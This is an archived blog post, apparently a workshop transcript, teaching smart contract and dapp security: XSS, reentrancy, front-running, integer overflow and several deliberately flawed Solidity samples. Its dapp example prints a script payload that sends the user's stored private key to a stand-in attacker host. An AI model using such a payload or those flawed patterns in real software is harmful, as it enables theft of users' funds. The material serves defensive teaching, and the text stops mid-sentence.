<!DOCTYPE html><!-- This site was created in Webflow. https://www.webflow.com --><!-- Last Published: Mon Jul 17 2023 22:17:53 GMT+0000 (Coordinated Universal Time) --><html data-wf-domain="flow-com.webflow.io" data-wf-page="637380c394c328ab5ad74bb3" data-wf-site="5f734f4dbd95382f4fdfa0ea" lang="en">
<!-- Mirrored from flow.com/engineering-blogs/introduction-to-smart-contract-and-dapp-security by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 22 Jul 2023 16:27:35 GMT -->
<head><meta charset="utf-8"/><title>Introduction to Smart Contract and DApp Security</title><meta content="Feb 20, 2018" name="description"/><meta content="Introduction to Smart Contract and DApp Security" property="og:title"/><meta content="Feb 20, 2018" property="og:description"/><meta content="https://assets-global.website-files.com/618c953e65cc2ba3f44d1a02/639b0d09637a1e6454b48cb6_1_1xB3SpaJ7UCKgWS3jFkqPg.webp" property="og:image"/><meta content="Introduction to Smart Contract and DApp Security" property="twitter:title"/><meta content="Feb 20, 2018" property="twitter:description"/><meta content="https://assets-global.website-files.com/618c953e65cc2ba3f44d1a02/639b0d09637a1e6454b48cb6_1_1xB3SpaJ7UCKgWS3jFkqPg.webp" property="twitter:image"/><meta property="og:type" content="website"/><meta content="summary_large_image" name="twitter:card"/><meta content="width=device-width, initial-scale=1" name="viewport"/><meta content="goOrjM0FiQtmK2lUJ9Y5NpPJA-fMUUc_6Q6Vmd7-XIY" name="google-site-verification"/><meta content="Webflow" name="generator"/><link href="../../assets-global.website-files.com/5f734f4dbd95382f4fdfa0ea/css/flow-com.webflow.9325b97a3.min.css" rel="stylesheet" type="text/css"/><link href="https://fonts.googleapis.com/" rel="preconnect"/><link href="https://fonts.gstatic.com/" rel="preconnect" crossorigin="anonymous"/><script src="../../ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script><script type="text/javascript">WebFont.load({  google: {    families: ["Epilogue:300,regular,500,600,700,800,900,italic"]  }});</script><script src="../../use.typekit.net/mgu2ukv.js" type="text/javascript"></script><script type="text/javascript">try{Typekit.load();}catch(e){}</script><script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script><link href="../../assets-global.website-files.com/5f734f4dbd95382f4fdfa0ea/616b1520779838b5f9174363_favicon.png" rel="shortcut icon" type="image/x-icon"/><link href="../../assets-global.website-files.com/5f734f4dbd95382f4fdfa0ea/616b1548fd01d005fc2bc2c7_logo256.png" rel="apple-touch-icon"/><link href="introduction-to-smart-contract-and-dapp-security.html" rel="canonical"/><style>
  .w-webflow-badge {
    display: none !important;
  }
</style>


<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'../../www.googletagmanager.com/gtm5445.html?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-PWSGFLB');</script>
<!-- End Google Tag Manager -->


<meta name="facebook-domain-verification" content="dhlb5fcuitl7owilmsg6xh307ohoyc" />

<!-- Hotjar Tracking Code for Flow.com -->
<script>
    (function(h,o,t,j,a,r){
        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
        h._hjSettings={hjid:3329982,hjsv:6};
        a=o.getElementsByTagName('head')[0];
        r=o.createElement('script');r.async=1;
        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
        a.appendChild(r);
    })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
</script>
<link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" /></head><body><div data-animation="default" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease" role="banner" class="navigation w-nav"><div class="nav-container w-container"><a href="../index.html" class="nav-logo-div w-nav-brand"><img src="https://assets-global.website-files.com/5f734f4dbd95382f4fdfa0ea/63ce603ae36f46f6bb67e51e_flow-logo.svg" loading="lazy" alt="flow logo" class="hide"/><div aria-label="Flow logo" class="nav-logo__embed w-embed"><svg width="100" height="42" viewBox="0 0 100 42" fill="none" xmlns="http://www.w3.org/2000/svg">
<g clip-path="url(#clip0_106_24812)">
<path class="logotype" d="M57.3672 20.9501H54.6797V30.971H50.9297V20.9501H48.9922V17.7376H50.9297V16.4876C50.9297 13.2501 52.9505 11.5876 56.0214 11.5876C56.4968 11.5916 56.9705 11.6475 57.4339 11.7543V15.5043C57.0296 15.3422 56.5985 15.2574 56.163 15.2543C55.9663 15.2387 55.7684 15.2659 55.5832 15.334C55.3979 15.4021 55.2296 15.5096 55.0899 15.6489C54.9501 15.7883 54.8422 15.9563 54.7735 16.1414C54.7049 16.3264 54.6771 16.5242 54.6922 16.721V17.7168H57.3797L57.3672 20.9501ZM63.013 30.971H59.2214V11.871H63.013V30.971Z" fill="black"/>
<path class="logotype" d="M71.4292 16.9085C72.851 16.906 74.2415 17.3255 75.4247 18.1139C76.6079 18.9023 77.5306 20.024 78.0758 21.3371C78.6211 22.6502 78.7644 24.0956 78.4876 25.4902C78.2108 26.8848 77.5264 28.1658 76.5211 29.1712C75.5157 30.1766 74.2346 30.861 72.84 31.1377C71.4454 31.4145 70.0001 31.2712 68.687 30.726C67.3739 30.1807 66.2521 29.2581 65.4638 28.0749C64.6754 26.8917 64.2559 25.5011 64.2584 24.0793C64.2466 23.1344 64.4241 22.1967 64.7803 21.3213C65.1365 20.446 65.6642 19.6508 66.3325 18.9826C67.0007 18.3144 67.7959 17.7866 68.6712 17.4304C69.5465 17.0742 70.4842 16.8968 71.4292 16.9085V16.9085ZM71.4292 27.596C73.3667 27.596 74.7625 25.9877 74.7625 24.0793C74.7834 23.6288 74.7126 23.1787 74.5544 22.7563C74.3963 22.3339 74.1541 21.9481 73.8424 21.622C73.5308 21.296 73.1562 21.0366 72.7414 20.8595C72.3266 20.6824 71.8802 20.5914 71.4292 20.5918C70.5213 20.6232 69.661 21.0058 69.0298 21.6592C68.3986 22.3125 68.0458 23.1855 68.0458 24.0939C68.0458 25.0024 68.3986 25.8753 69.0298 26.5286C69.661 27.182 70.5213 27.5647 71.4292 27.596Z" fill="black"/>
<path class="logotype" d="M82.5576 17.1875L84.9951 26.3542L87.4326 19.0708L86.7659 17.1917H90.5159L93.7284 26.3583L96.1076 17.1917H99.9992L95.9034 30.975H91.9701L89.2284 23.4167L86.6659 30.9708H82.7076L78.6367 17.1875H82.5576Z" fill="black"/>
<path d="M20.8333 41.8334C32.3393 41.8334 41.6667 32.506 41.6667 21.0001C41.6667 9.49415 32.3393 0.166748 20.8333 0.166748C9.3274 0.166748 0 9.49415 0 21.0001C0 32.506 9.3274 41.8334 20.8333 41.8334Z" fill="#00EF8B"/>
<path d="M29.9732 17.7417H24.0898V23.625H29.9732V17.7417Z" fill="white"/>
<path d="M18.2138 25.8292C18.2138 26.266 18.0843 26.6929 17.8416 27.0561C17.599 27.4192 17.2541 27.7023 16.8506 27.8694C16.447 28.0366 16.003 28.0803 15.5746 27.9951C15.1463 27.9099 14.7528 27.6996 14.4439 27.3907C14.1351 27.0819 13.9248 26.6884 13.8396 26.26C13.7544 25.8316 13.7981 25.3876 13.9652 24.9841C14.1324 24.5806 14.4154 24.2357 14.7786 23.993C15.1417 23.7504 15.5687 23.6209 16.0055 23.6209H18.2138V17.7417H16.0055C14.4059 17.7417 12.8423 18.216 11.5123 19.1047C10.1823 19.9934 9.14572 21.2564 8.5336 22.7342C7.92147 24.212 7.76131 25.8382 8.07337 27.407C8.38543 28.9758 9.15569 30.4169 10.2867 31.5479C11.4178 32.679 12.8589 33.4492 14.4277 33.7613C15.9965 34.0733 17.6226 33.9132 19.1004 33.3011C20.5782 32.6889 21.8413 31.6523 22.73 30.3224C23.6186 28.9924 24.093 27.4287 24.093 25.8292V23.6209H18.2138V25.8292Z" fill="white"/>
<path d="M26.2984 14.8001H32.9151V8.91675H26.2984C24.1542 8.91895 22.0984 9.77174 20.5821 11.288C19.0659 12.8042 18.2131 14.86 18.2109 17.0042V17.7417H24.0901V17.0042C24.0912 16.4193 24.3244 15.8587 24.7384 15.4454C25.1524 15.0322 25.7135 14.8001 26.2984 14.8001V14.8001Z" fill="white"/>
<path d="M18.2109 23.6209H24.0901V17.7417H18.2109V23.6209Z" fill="#00EF8B"/>
</g>
<defs>
<clipPath id="clip0_106_24812">
<rect width="100" height="41.6666" fill="white" transform="translate(0 0.166748)"/>
</clipPath>
</defs>
</svg></div></a><nav role="navigation" class="new-navigation-menu w-nav-menu"><div data-hover="false" data-delay="0" class="w-dropdown"><div class="new-nav-link w-dropdown-toggle"><div class="nav-link-text">Solutions</div><div class="nav-link-dropdown-icon w-icon-dropdown-toggle"></div></div><nav class="navigation-dropdown-list w-dropdown-list"><a href="../hybrid-custody.html" class="navigation-dropdown-link w-dropdown-link">Walletless Onboarding +Hybrid Custody</a><a href="http://developers.flow.com/hybrid-custody/guides/account-abstraction" target="_blank" class="navigation-dropdown-link icon w-dropdown-link">Account Abstraction</a><a href="https://developers.flow.com/cadence" target="_blank" class="navigation-dropdown-link icon w-dropdown-link">Cadence</a></nav></div><div data-hover="false" data-delay="0" class="w-dropdown"><div class="new-nav-link w-dropdown-toggle"><div class="nav-link-text">Developers</div><div class="nav-link-dropdown-icon w-icon-dropdown-toggle"></div></div><nav class="navigation-dropdown-list w-dropdown-list"><a href="https://developers.flow.com/" target="_blank" class="navigation-dropdown-link icon w-dropdown-link">Developer portal</a><a href="https://github.com/onflow" class="navigation-dropdown-link w-dropdown-link">GitHub</a></nav></div><div data-hover="false" data-delay="0" class="w-dropdown"><div class="new-nav-link w-dropdown-toggle"><div class="nav-link-text">Ecosystem</div><div class="nav-link-dropdown-icon w-icon-dropdown-toggle"></div></div><nav class="navigation-dropdown-list ecosystem w-dropdown-list"><a href="https://www.flowverse.co/" target="_blank" class="navigation-dropdown-link icon w-dropdown-link">Flowverse</a></nav></div><div data-hover="false" data-delay="0" class="w-dropdown"><div class="new-nav-link w-dropdown-toggle"><div class="nav-link-text">Community</div><div class="nav-link-dropdown-icon w-icon-dropdown-toggle"></div></div><nav class="navigation-dropdown-list community w-dropdown-list"><a href="../flow-ambassador-program.html" class="navigation-dropdown-link w-dropdown-link">Ambassador program</a><a href="../blog.html" class="navigation-dropdown-link w-dropdown-link">Blog</a><a href="https://forum.onflow.org/" target="_blank" class="navigation-dropdown-link icon w-dropdown-link">Forum</a><a href="https://discord.com/invite/J6fFnh2xx6" target="_blank" class="navigation-dropdown-link discord w-dropdown-link">Discord</a><a href="https://twitter.com/flow_blockchain" class="navigation-dropdown-link twitter w-dropdown-link">Twitter</a></nav></div><div data-hover="false" data-delay="100" class="w-dropdown"><div class="new-nav-link w-dropdown-toggle"><div class="nav-link-text">About</div><div class="nav-link-dropdown-icon w-icon-dropdown-toggle"></div></div><nav class="navigation-dropdown-list ecosystem w-dropdown-list"><a href="../primer.html" class="navigation-dropdown-link w-dropdown-link">Primer</a><a href="../priorities.html" class="navigation-dropdown-link w-dropdown-link">Priorities</a><a href="../use-cases.html" class="navigation-dropdown-link w-dropdown-link">Use Cases</a><a href="../flow-token-economics.html" class="navigation-dropdown-link w-dropdown-link">Token economics</a><a href="../technical-paper.html" class="navigation-dropdown-link w-dropdown-link">Technical papers</a><a href="../sustainability.html" class="navigation-dropdown-link w-dropdown-link">Sustainability</a></nav></div></nav><div class="new-menu-button w-nav-button"><div class="w-icon-nav-menu"></div></div></div></div><div><div class="post-with-image-layout"><div class="blog-post-hero-2 wf-section"><div class="post-container w-container"><div><div class="blog-post-meta-data in-post"><div class="w-dyn-list"><div role="list" class="eng-blog-category-list w-dyn-items"><div role="listitem" class="w-dyn-item"><a href="../engineering-categories/cadence.html" class="radius-text w-inline-block"><div class="eco-text-2">Cadence</div></a></div></div></div><div class="small-dot-sep inpost left"></div><div class="blog-post-meta-text-data">February 20, 2018</div></div><div class="main-blog-post-title">Introduction to Smart Contract and DApp Security</div><div class="blog-post-meta-data post"><a href="../authors/joshua-hannan.html" class="blog-post-meta-text-data dark">Joshua Hannan</a><div class="small-dot-sep"></div><div class="blog-post-meta-text-data">Smart Contract Engineer at Dapper Labs</div></div></div></div></div><div class="blog-post-section wf-section"><div class="container-25 _1280 w-container"><div class="post-info-parent"><div class="post-share-sidebar"><div class="social-share-btn-2 tw"></div><div class="social-share-btn-2 email"></div><div class="share-text">Share</div></div><div class="post-main-info-div eng"><img loading="lazy" src="https://assets-global.website-files.com/618c953e65cc2ba3f44d1a02/639b0d09637a1e6454b48cb6_1_1xB3SpaJ7UCKgWS3jFkqPg.webp" alt="Introduction to Smart Contract and DApp Security" sizes="(max-width: 479px) 83vw, (max-width: 767px) 92vw, (max-width: 991px) 81vw, 750px" srcset="https://assets-global.website-files.com/618c953e65cc2ba3f44d1a02/639b0d09637a1e6454b48cb6_1_1xB3SpaJ7UCKgWS3jFkqPg-p-500.webp 500w, https://assets-global.website-files.com/618c953e65cc2ba3f44d1a02/639b0d09637a1e6454b48cb6_1_1xB3SpaJ7UCKgWS3jFkqPg-p-800.webp 800w, https://assets-global.website-files.com/618c953e65cc2ba3f44d1a02/639b0d09637a1e6454b48cb6_1_1xB3SpaJ7UCKgWS3jFkqPg-p-1080.webp 1080w, https://assets-global.website-files.com/618c953e65cc2ba3f44d1a02/639b0d09637a1e6454b48cb6_1_1xB3SpaJ7UCKgWS3jFkqPg.webp 1248w" class="blog-post-main-image"/><div class="blog-post-rich-text-block w-richtext"><p><em>This is a transcript of a workshop I led at </em><a href="https://ethdenver.com/" target="_blank"><em>ETHDenver</em></a><em> with </em><a href="https://twitter.com/jessicica14" target="_blank"><em>Jessica Marshall</em></a><em>, </em><a href="https://medium.com/u/d9faed34fd6c?source=post_page-----556502629d54--------------------------------" target="_blank"><em>William Dias</em></a><em>, and </em><a href="https://medium.com/u/9504cccc65eb?source=post_page-----556502629d54--------------------------------" target="_blank"><em>C. Brown</em></a><em>. You can see the video of it on their</em><a href="https://www.facebook.com/pg/ETHDenver/videos/?ref=page_internal" target="_blank"><em> facebook page.</em></a></p><figure class="w-richtext-figure-type- "><div><img alt="" src="../../assets-global.website-files.com/618c953e65cc2ba3f44d1a02/639b0d04131289d13b077961_1_Yj6Ev_j2LYMBNpeCdk2PdA.png"/></div></figure><figure class="w-richtext-figure-type- "><div><img alt="" src="../../assets-global.website-files.com/618c953e65cc2ba3f44d1a02/639b0d0455aa469c78375f4d_1_1xB3SpaJ7UCKgWS3jFkqPg.jpg"/></div><figcaption>Look at those amazing Engineers!</figcaption></figure><p>Smart contract and dapp programming is a new paradigm that requires us as developers to behave differently than before. The old facebook adage of move fast and break things does not work in this new paradigm. With the risks inherent to this type of development, we all need to learn to take a slow and methodical approach to building our applications, using care and consideration while designing and coding. We also cannot put ourselves under undue pressure to meet strict deadlines. It is kind of ironic that I was giving this talk at a hackathon!</p><p>If building most traditional webapps is similar to a minute clinic, then blockchain is more comparable to an Emergency Room. Some issues are small, but most of them are extremely hard to fix once you get past a certain point, if at all, and every possible negative outcome has to be accounted for. If not, you could be facing dire consequences. Before I get into specific lessons, I would like to reiterate some of the aspects of the technology that force us to be so careful.</p><h3>All code is public</h3><p>This poses an issue for a few different reasons. Firstly, since anyone can see your code, it should be obvious that there should be no sensitive personal information recorded in the smart contract. Sure, wanting to run user data analytics on chain is a noble cause, but that might not sound very good to your new user Johnny because his browser history was just exposed to the world!</p><figure class="w-richtext-figure-type- "><div><img alt="" src="../../assets-global.website-files.com/618c953e65cc2ba3f44d1a02/639b0d0446c5ff6407cb1a9c_1_2fOR_zL7qeAhyQR94SvkRA.png"/></div><figcaption>uh oh</figcaption></figure><p>Your smart contract and its associated storage should only be storing the information that is absolutely necessary for the contract to function correctly.</p><p>Second, and more importantly, all of your source code is visible to the public. That means every all-star hacker sitting in his basement has all the time and freedom in the world to comb through every single line looking for bugs. No hiding behind pre-compiled binaries this time.</p><h3>Gas Limit</h3><p>As I am sure most of you know, computation on the Ethereum blockchain is expensive and there is also a limit! This can pose a problem when you have logic in your contract that has the potential to be manipulated in a way that causes a lot of gas to be consumed. Loops are a common cause of this.</p><p>And lastly, but most importantly:</p><h3>Immutability</h3><h4>All code executes exactly according to how it was programmed, and barring a DAO-level hard fork, actions taken on the blockchain are immutable</h4><p>So no takesies backsies. THIS is how we ensure trustlessness. We program trust into our code so that we can trust it, not each other. In fact, I’m starting to trust smart contracts more that I trust some humans. Smart contracts won’t lie to you, smart contracts won’t cheat on you, and smart contracts won’t post angry tweets about North Korea at 2am on a Tuesday.</p><p>I, for one, welcome our eventual global blockchain overlords.</p><p>But before we get to that point, we gotta be the ones doing the building! Our smart contracts should be hacker-proof, script-proof, and even tech illiterate grandma-proof. If our tech-illiterate grandma accidentally posts her google search for hemorrhoid cream to Facebook, its not a huge deal, we can just delete it. But if she exposes her public key because of a poorly written smart contract, there is not much we can do. And her tech-savvy nephew Johnny can’t help her because he’s too busy trying to delete his browser history from the blockchain!</p><p>We gotta assume everyone is a tech-illiterate granny and be as thorough as possible making sure that functions are called correctly and operations are performed without error, because you never know, some guy messing around with your multi-sig wallet library with millions of dollars in Ether might just accidentally take ownership and suicide the whole thing.</p><p>I’m going to go through a few examples of vulnerabilities you should prepare against, and we’ll have some exercises to get everyone involved.</p><p>Lets get ready to diagnose some application and smart contract vulnerabilities.</p><h3>Application Examples and Reccomendations</h3><p><em>by </em><a href="https://medium.com/u/d9faed34fd6c?source=post_page-----556502629d54--------------------------------" target="_blank"><em>William Dias</em></a></p><p>Time for our first patient. This one is named, “Application Security.” Let’s start with some background.</p><p>This is a Decentralized gaming platform:</p><ul role="list"><li>This is a browser-based application</li><li>Game devs can openly publish their games (dapps running on the ethereum network)</li><li>Players can sign up to the dapp and choose from a variety of games to play (and eventually spend their ETH in virtual goods).</li><li>New wallets are created at signup (no need for Mist/Metamask in this case).</li><li>Wallet keys are stored into player’s browser for authentication/micro-payments purposes.</li></ul><p>As you can see, this seems like a great place for developers to publish and connect with players all through one platform.</p><p>Unfortunately, when one game, HODL QUEST, is published, users who download it immediately start losing ether from their wallets.</p><figure class="w-richtext-figure-type- "><div><img alt="" src="../../assets-global.website-files.com/618c953e65cc2ba3f44d1a02/639b0d04e1266c1a7c229455_1_rsQlUsCveDIDtkjIgCLX4w.png"/></div></figure><p>Where did the ether go? Let’s examine some of the aspects of the platform to find out.</p><ul role="list"><li>The problem was caused by a new game published a few hours ago (HODL QUEST)</li><li>Wallet funds are gone seconds after opening the game for the first time</li><li>During game registration the developer enters a name, smart contract address and URL for the dapp in a form inside the platform</li><li>The platform embeds the game iframe into the dapp while displaying the game name at the top of the page.</li></ul><p>You can start to see where this is going… After further inspection we found that the game developer for HODL QUEST injected an inline script into the game title during registration. So looking closely at the game html code, we found something like this:</p><p>&lt;h1&gt;HODL &lt;script&gt;$.post(‘https://haxxx.lol/’, localStore.getItem(‘privateKey’));&lt;/script&gt; QUEST&lt;/h1&gt;</p><p>The player’s browser ends up evaluating the javascript snippet inserted at the game title and sending the player’s private keys to attacker remote servers.</p><p>This is just one of many issues that could arise as we are building decentralized applications. Here is a checklist of things to keep in mind as you’re building these projects.</p><ul role="list"><li><strong>Protect wallets and private keys:</strong> If user’s wallets are compromised, this is game over. Extreme care needs to be taken when handling this sensitive information.</li><li><strong>Protect user information:</strong> Users do not want their personal data being exposed to the world. Ensure that user data remains private.</li><li><strong>Evaluate wisely what needs to be stored in the blockchain or in your servers.</strong> Only include data that is absolutely necessary for you smart contracts to function within the contracts themselves.</li><li><strong>Use HTTPS:</strong> This is standard practice and should be obvious</li><li><strong>.gitignore sensitive files:</strong> Another way to protect yourself from accidentally revealing a vulnerability</li><li><strong>Do not insert access/API keys into your code.</strong></li><li><strong>Ask for 2FA when performing critical/risky tasks inside the dapp: </strong>Actions taken on the blockchain are immutable so having an extra layer of security is very important.</li></ul><p>Your application’s security is just as important as your smart contracts’ security and should always be on your mind.</p><h3>Smart Contract Race Conditions</h3><p><em>by </em><a href="https://twitter.com/jessicica14" target="_blank"><em>Jessica Marshall</em></a></p><p>What is a Race Condition? A race condition is the behavior of an electronics, software, or other system where the output is dependent on the sequence or timing of other uncontrollable events. It becomes a bug when events do not happen in the order the programmer intended. This is the root of many vulnerabilities in Ethereum smart contracts.</p><figure class="w-richtext-figure-type- "><div><img alt="" src="../../assets-global.website-files.com/618c953e65cc2ba3f44d1a02/639b0d045c967fd9e69a67af_1_eEzE7W_zC52taFmHNCry8g.png"/></div><figcaption>A silly example of a race condition</figcaption></figure><p>There are a few different ways race conditions pop up in Ethereum smart contracts. In this post, we’ll focus on two common situations. Reentrancy and transaction order front-running.</p><h3>Reentrancy</h3><p>A computer program is called <strong>reentrant</strong> if it can be interrupted in the middle of its execution and then safely be called again (“re-entered”) before its previous invocations complete execution. This can show up in smart contracts when making external calls to other contracts because they can potentially call back into the original function before the original call finishes. How is this possible, you ask?</p><p>Enter <strong>fallback functions, </strong>which are functions that are invoked when Ether is sent to your contract without providing a function name to call.</p><figure class="w-richtext-figure-type- "><div><img alt="" src="../../assets-global.website-files.com/618c953e65cc2ba3f44d1a02/639b0d0486e0b19271dd1e0a_1_S8fC4ujv-KFL17ZY_loSDw.png"/></div></figure><p>In this example, when the withdraw function sends ether with the <em>address.call.value() </em>method, it triggers the BankRobber’s fallback function, which can then call the withdraw method again. As you can see, this will cause the Bank contract to send Ether over and over again potentially draining the Bank of all its ether!</p><p>How can we prevent this? There are a few different ways. The first relies on our understanding of the difference between send, transfer, and call.</p><figure class="w-richtext-figure-type- "><div><img alt="" src="../../assets-global.website-files.com/618c953e65cc2ba3f44d1a02/639b0d04e08e8771517503a7_1_n_y3GoeWnW93zOEp9ARA_A.png"/></div><figcaption>SO MANY OPTIONS</figcaption></figure><p>As you can see from the chart above, there are many different ways to send Ether, but most of the time, you’ll want to use address.transfer. This is because transfer only forwards 2300 gas and reverts if the transaction uses up all the gas. This way, if a malicious contracts attempts to reenter your contract, the gas will be used up and the entire transaction will be reverted.</p><p>There are situations where using send or call would make sense, but you need to be extra careful when using these because it would only be in special situations when you feel very comfortable about what the contracts you are sending ether to are doing. 99% of the time, transfer is the correct path to take.</p><p>Another way to prevent against reentrancy is to update state before making external calls and perform checks in your contract to make sure that the state represents the transaction that is about to be performed.</p><h3>Transaction Ordering Front-Running</h3><p>Another situation where race conditions rear its ugly head is front running. This happens because of the public nature of the blockchain. If you’re running an auction or similar mechanism in your smart contracts, bids might be able to be manipulated because the bids exist in the unconfirmed transaction pool before they are executed. In this period of time, other malicious actors can monitor the pool and send transactions that undermine bids that have already been sent. Additionally, miners can reorder transactions in a block to give malicious transactions priority.</p><p>There are a few different ways to prevent manipulation like this. One is a batch auction and another is a <a href="https://karl.tech/learning-solidity-part-2-voting/" target="_blank">commit and reveal scheme</a> where bidders send hashes of their bids so they aren’t revealed until after they are confirmed.</p><p>Lets try to save another patient.</p><p>This a contract that does a king of the hill game where people can send ether to a contract to become the new king. When someone new becomes the king, the old king gets sent the contract’s ether. Can you find the vulnerability?</p><figure class="w-richtext-figure-type- "><div><img alt="" src="https://assets-global.website-files.com/img/image-placeholder.svg"/></div></figure><p>Reentrancy isn’t an issue, but there is something a little bit more “watch the world burn-y” in this vulnerability. In this example, a contract to become king and then in their fallback function, they could revert. This causes every future transaction that tries to make a new owner fail, essentially shutting down the contract. This is a great example from Ethernaut, which has exercises to explore smart contract security. You can see a more detailed description of the vulnerability <a href="https://medium.com/@christian.ruink/ethernaut-king-problem-2ccec1ee4190">here.</a></p><p>These examples show that when making external calls, you should never assume that the contract you are invoking is trusted. Always take care to prevent against every possible negative outcome that an attacker could attempt.</p><h3>Additional Smart Contract Best Practices to be Aware of</h3><h4>Fallback Functions</h4><p>Fallback functions are useful because they contain the code that is invoked when Ether is sent to your contract. But they can’t handle everything.</p><p>First of all, fallback functions only have access to 2,300 gas when triggered from a transfer function, so logic needs to be very simple in order to not run into an out of gas error.</p><div class="w-embed"><pre><code class="language-markup"><!--
// example of a fallback function when
// you don't want Ether to be sent to a contract
function () payable {
  revert()
}
}--!></code></pre></div><p>There is a catch! fallback functions do not trigger when ether is forcibly sent to a contract.</p><div class="w-embed"><pre><code class="language-markup"><!--
contract ForceSend() {
  function ForceSend() {
  // sends ETH to victim without triggering the fallback function
  function destroy() {
    selfdestruct(victim);
  }
}
}--!></code></pre></div><p>The selfdestruct function sends the contract’s ether to the victim address. This send does not trigger the fallback function in the contract. Receiving free Ether is nice, but because of this, you need to avoid directly checking the balance of a contract and expecting it to be a certain value, because it might actually be greater than you thought!</p><h3>Integer Arithmetic</h3><p>Unlike most modern architectures, the EVM does not handle floating point numbers or arithmetic operations. All number storage and arithmetic is handled with integers. What does this mean? It means there is no point in your contract where you can store anything as a decimal or do operations that would normally return a decimal, like finding percentages and such. Lets look at an example.</p><p>Imagine you are creating a token sale smart contract that gives buyers a bonus purchase based on how much time has passed in the sale. It might look something like this.</p><div class="w-embed"><pre><code class="language-markup"><!--
/// snippet from contract code
function calculatePrice() returns (uint256) {
  uint percentTimePassed = (now - startTime)/(endTime - startTime);
  uint price = (1-percentTimePassed)*basePrice + basePrice;
  return price;
}
}--!></code></pre></div><p>As you can see, in a traditional language, this would be fine. The percentage of time passed would be calculated as a decimal between zero and one and then applied to the price.</p><p>Unfortunately, this doesn’t work with integer arithmetic. If a operation is done incorrectly, you could image some situations where an incorrect percentage would result in some serious issues.</p><p>In Solidity, you would have to do something like this:</p><div class="w-embed"><pre><code class="language-markup"><!--
/// snippet from contract code
function calculatePrice() returns (uint256) {
  uint percentTimePassed = 100*(now - startTime)/(endTime - startTime);
  uint price = ((1-percentTimePassed)*basePrice)/100 + basePrice;
  return price;
}
}--!></code></pre></div><p>This way, the percentage is calculated as an integer between 0 and 100, applied to the base price, and then divided by 100 to fix the “decimal place” to the correct point. This is a somewhat crude way to calculate the percentage because it sacrifices some precision, but is necessary based on how the EVM operates. You can get better precision by multiplying by larger multiples of 100, but that is a decision that depends on the context of the contract.</p><h3>Integer Overflow/Underflow</h3><p>According to <a href="https://en.wikipedia.org/wiki/Integer_overflow" target="_blank">Wikipedia</a>, an <strong>integer overflow</strong> occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits — either larger than the maximum or lower than the minimum representable value. Most languages have ways to account for this issue, but Solidity cannot handle overflow checking on its own. This has caused issues in the past with a few smart contracts on the blockchain, but there are easy ways to get around the problem. Here is an example for addition using Solidity:</p><div class="w-embed"><pre><code class="language-markup"><!--
function add(uint a, uint b) {      
  res = a + b
  if (res-b == a) && (res>b || res==b)  {
    // the operation was safe  
  } else {
    // overflow
  }   
}
}--!></code></pre></div><p>This checks for overflow on an addition operation by ensuring that the result didn’t wrap around the maximum value held by the variables. There are similar checks needed for subtraction, multiplication, and division.</p><p>Luckily there are libraries that do this for you! You can check out our <a href="https://github.com/Modular-Network/ethereum-libraries/tree/master/BasicMathLib" target="_blank">Basic Math Library</a> and use it to handle all of these cases in your smart contracts.</p><h3>Patient #3</h3><p>Can you find the bug in the contract?</p><div class="w-embed"><pre><code class="language-markup"><!--
uint[] public bonusCodes;
function pushBonusCode(uint code) onlyOwner {
  bonusCodes.push(code);    
}     
function popBonusCode() onlyOwner {        
  require(bonusCodes.length >= 0);        
  bonusCodes.length--;   
}     
function modifyBonusCode(uint index, uint update) onlyOwner {
  require(index < bonusCodes.length);        
  bonusCodes[index] = update;    
}
}--!></code></pre></div><p>This is from <a href="https://medium.com/u/d366098f65db?source=post_page-----556502629d54--------------------------------" target="_blank">Doug Hoyte</a>’s contribution to the Underhanded Solidity coding contest!</p><p>From the <a href="https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079">post</a> detailing the results, this contract features a storage array whose length field can be decremented below 0. This causes an arithmetic underflow, effectively disabling Solidity’s array bounds checking. As a result, after the overflow writes to the array can be used to overwrite any storage element located after the array — including all mappings!</p><p>So what did we miss?</p><p>The thing is, we don’t really know for sure. There could be some tiny thing that we don’t account for, and that could be the issue that kills the patient, or in our case, costs our users millions of dollars in Ether.</p><p>The best we can do is follow all the existing application and smart contract best practices the entire time we are designing our application and writing the code, test extensively, and get our code audited by someone who knows what to look for.</p><p>There is something else that can be used to improve the functionality and security of your smart contracts!</p><h3>LIBRARIES!!</h3><p>And more specifically, <a href="https://github.com/Modular-Network/ethereum-libraries" target="_blank">Modular’s Ethereum-Libraries</a>.</p><p>Before you sit down to write your code, realize that there are a bunch of other great developers in the community who have probably already done something similar to what you’re trying to do, and probably have tested, secure code that you can use for some common functionality in your own project.</p><p>With Solidity Libraries, you can import the library into your smart contract and use the functions just like they were in your contract! We have over 20 libraries deployed on the test networks and mainnet for a variety of uses, like basic math, arrays, linked lists, tokens, and even crowdsales. This is production-tested code that can be integrated into your project easily.</p><p>Check out our <a href="https://github.com/Modular-Network/ethereum-libraries" target="_blank">repository</a> for instructions on how to get started!</p><p>Now you have some tools to stay safe while building smart contracts and distributed applications. All thats left is to build things while being safe along the way. And don’t forget, the technology is still in its infancy. We are learning new things about the EVM and Solidity every day, so always stay up to date on the best practices for Ethereum development and any updates to the ecosystem. There are some great resources you can use in your learning experience.</p><p><a href="https://consensys.github.io/smart-contract-best-practices/" target="_blank">Consensys’ Smart Contract Best Practices Documents</a>: These are great notes that explore the vulnerabilities discussed today as well and many others that are important.</p><p>Modular’s Ethereum Libraries Repository: Here you can find detailed instructions on how to integrate our libraries into your project.</p><p>So, we may not have been able to save little Johnny from a lifetime of browser history induced shame, but if we follow the guidelines outlined in this post, we might be able to save millions more from a 